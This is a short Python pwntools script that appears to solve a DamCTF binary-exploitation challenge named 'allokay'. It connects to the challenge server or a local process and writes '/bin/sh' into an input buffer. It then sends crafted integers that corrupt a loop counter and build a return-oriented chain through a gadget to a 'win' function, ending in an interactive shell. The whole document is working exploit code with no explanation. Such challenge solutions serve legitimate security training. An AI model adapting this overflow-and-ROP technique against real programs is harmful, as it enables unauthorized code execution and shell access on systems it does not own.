from pwn import *

e = ELF("./allokay")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("chals.damctf.xyz", 32575)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter("have?", "100".ljust(8, "\x00") + "/bin/sh\x00")

for i in range(18):
  p.sendlineafter(":", str(u64("\x00" * 4 + p32(0x30))))

p.sendlineafter(":", str(u64("\x00" * 4 + p32(0x20))))
p.sendlineafter(":", str(u64("\x00" * 4 + p32(19 + 7))))

p.sendlineafter(":", str( 0x00400933   ))
p.sendlineafter(":", str( 0x006010a8   ))
p.sendlineafter(":", str(e.symbols["win"]))
for i in range(48 - 27 - 3):
  p.sendlineafter(":", str(e.symbols["main"]))


p.interactive()
